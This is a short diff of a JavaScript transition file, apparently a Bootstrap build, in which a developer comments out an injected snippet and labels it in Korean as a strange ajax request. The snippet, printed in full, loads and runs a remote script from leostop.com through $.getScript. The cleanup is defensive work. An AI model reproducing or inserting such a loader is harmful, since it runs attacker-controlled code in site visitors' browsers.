@@ -224,8 +224,8 @@
   };
   setTransitionEndSupport();
 
-
-  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	//이상한 ajax요청 주석처리 - ty
+ /* function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });*/
 
 
   /**
